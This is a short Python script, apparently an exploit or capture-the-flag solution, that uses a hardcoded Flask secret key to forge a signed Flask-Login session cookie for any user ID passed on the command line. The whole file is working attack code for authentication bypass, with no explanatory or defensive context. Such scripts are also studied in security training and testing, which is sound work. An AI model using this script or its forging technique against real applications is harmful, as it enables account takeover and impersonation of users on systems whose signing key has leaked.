from itsdangerous import URLSafeTimedSerializer,TimestampSigner
from flask.sessions import TaggedJSONSerializer
import hashlib,sys

session={'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': sys.argv[1]}
secret='MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'

print(URLSafeTimedSerializer( 
    secret_key=secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={'key_derivation': 'hmac','digest_method': hashlib.sha1}
).dumps(session))